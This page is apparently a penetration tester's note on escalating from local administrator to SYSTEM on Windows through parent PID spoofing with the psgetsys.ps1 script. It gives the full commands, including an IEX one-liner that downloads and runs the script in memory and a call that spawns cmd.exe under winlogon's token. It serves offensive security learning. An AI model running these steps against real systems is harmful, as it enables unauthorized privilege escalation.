<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Getting SYSTEM from Local Admin</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Getting SYSTEM from Local Admin</h1><br /><br /><strong>Prerequisites:</strong><br />•
    SeDebugPrivilege (usually Adminitrators have it)<br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;whoami&nbsp;/priv</div>
    </div><br /> <a href=""><img src="images/1374-1.png" alt="images/1374-1.png" /></a><br />• WINDOWS OS &gt;=
    Vista<br /><br />Getting from a local administrator account to SYSTEM can be done in a variety of ways. The most
    common way, of course, is using <a
      href="--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--9._Access_Tokens_(UAC)--getsystem_(meterpreter).html">Metasploit&#39;s
      getsystem</a> that use <strong>Token Duplication</strong> with the function <a
      href="https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/namedpipe.c#L241" target="_blank">elevate_via_service_tokendup</a>.
    <br />Alternatively if we do not want use Metasploit, <a
      href="https://github.com/decoder-it/psgetsystem" target="_blank">decoder_it</a>(Andrea Pierini) created a PowerShell script <a
      href="https://github.com/decoder-it/psgetsystem" target="_blank">psgetsys.ps1</a> to go from a Local Administrative PowerShell
    prompt to System.<br /><br />Normally, when a process launches a child process, it becomes the parent of the child
    process. However starting form Windows Vista it is possible to alter this behavior. If we create a new process
    setting also the parent process property, the child process will inherit the token of the specified parent process
    and impersonate this one. So if we create a new process, setting the parent PID the process owned by SYSTEM, we did
    it!<br />Of course, we need to have elevated rights in order to create a process from the parent process handle,
    typically seDebugPrivilege which administrators have (note: if a regular user has this privilege too, he has the
    keys for the kingdom!). Keep in mind that this privilege is available only from an elevated command
    prompt.<br /><span style="text-decoration:underline;">Shortly</span>: Psgetsystem allows us to get SYSTEM privileges
    via a parent process that have SYSTEM privileges, which then spawns a child process which effectively inherits the
    SYSTEM access privileges of the parent.<br /><br />1. Download in memory psgetsys.ps1&#39;<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1&#39;);
      </div>
    </div><br />2. Identify a SYSTEM process to which we can “piggyback” onto. Not all SYSTEM services are ok<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;Get-Process&nbsp;-IncludeUserName&nbsp;|&nbsp;Where-Object&nbsp;{$_.UserName&nbsp;-match&nbsp;&quot;SYSTEM&quot;}&nbsp;|&nbsp;&nbsp;Format-List&nbsp;–Property&nbsp;Username,Name,Id
      </div>
    </div><br /> <a href=""><img src="images/1374-2.png" alt="images/1374-2.png" /></a><br /> Usually winlogon is
    ok<br />4. instruct psgetsystem to run “cmd.exe” <br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;[MyProcess]::CreateProcessFromParent<span
          style="color:#000000;font-weight:400">(</span>&lt;processID_run_by_system&gt;,”cmd.exe”,&quot;&quot;<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br /> <a href=""><img src="images/1374-3.png" alt="images/1374-3.png" /></a><br /> <a href=""><img
        src="images/1374-4.png" alt="images/1374-4.png" /></a><br /> <a href=""><img src="images/1374-5.png"
        alt="images/1374-5.png" /></a><br /><br />Verify with Process Explorer (<a
      href="https://download.sysinternals.com/files/ProcessExplorer.zip" target="_blank">https://download.sysinternals.com/files/ProcessExplorer.zip</a>)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/ProcessExplorer.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\procexp.exe&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1374-6.png" alt="images/1374-6.png" /></a><br /><br />Bibliography:<br />•
    <a
      href="https://decoder.cloud/2018/02/02/getting-system/" target="_blank">https://decoder.cloud/2018/02/02/getting-system/</a><br />•
    <a
      href="https://pentestlab.blog/2020/02/24/parent-pid-spoofing/" target="_blank">https://pentestlab.blog/2020/02/24/parent-pid-spoofing/</a>
  </div>
</body>

</html>